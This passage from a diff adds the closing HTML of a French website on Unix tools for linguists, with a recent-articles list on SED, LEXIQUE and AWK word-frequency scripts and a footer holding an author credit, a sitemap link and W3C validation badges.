+		<a href="/presentation-outils-unix/les-editeurs-unix/29-introduction-a-sed-editeur-de-flux-pour-les-linguistes" class="latestnews">
+			Introduction à SED : éditeur de flux pour les linguistes</a>
+	</li>
+	<li class="latestnews">
+		<a href="/banque-donnees-linguistique/frequences/28-liste-des-mots-les-plus-frequents-avec-lexique" class="latestnews">
+			Liste des mots les plus fréquents avec LEXIQUE</a>
+	</li>
+	<li class="latestnews">
+		<a href="/scripts-linguistiques-dictionnaires-banques-bibliotheques/script-awk-lexique/27-utiliser-lexique-awk-et-sort-pour-obtenir-une-liste-des-mots-les-plus-frequents" class="latestnews">
+			Utiliser LEXIQUE, AWK et SORT pour obtenir une liste des mots les plus fréquents</a>
+	</li>
+</ul>
+			</div>
+			
+		</div>
+		</div>
+		<!-- END: CONTENT -->
+
+		
+		</div>
+
+		
+	</div>
+	</div>
+</div>
+</div>
+
+
+<!-- BEGIN: FOOTER -->
+<div id="ja-footerwrap">
+<div id="ja-footer" class="clearfix">
+
+	<div id="ja-footnav">
+		
+	</div>
+
+	<div class="copyright">
+		<p style="text-align: center;"><a href="http://vivienschmitt.fr" title="Analyste Programmeur">vivien schmitt</a></p>
+<p style="text-align: center;"><a href="/component/xmap/?sitemap=1&amp;view=xml&amp;no_html=1" title="plan du site xml">Map xml</a></p>
+	</div>
+
+	<div class="ja-cert">
+		
+    <a href="http://jigsaw.w3.org/css-validator/check/referer" target="_blank" title="Notre site est valide CSS" style="text-decoration: none;">
+		<img src="http://www.lingunix.org/templates/ja_purity/images/but-css.gif" border="none" alt="Notre site est valide CSS" />
+		</a>
+		<a href="http://validator.w3.org/check/referer" target="_blank" title="Notre site est valide XHTML 1.0 Transitional" style="text-decoration: none;">
+		<img src="http://www.lingunix.org/templates/ja_purity/images/but-xhtml10.gif" border="none" alt="Notre site est valide XHTML 1.0 Transitional" />
+		</a>
+	</div>
+
+	<br />
+</div>
+</div>
+<!-- END: FOOTER -->
+
+</div>
+
+
+
+</body>
+
+</html>
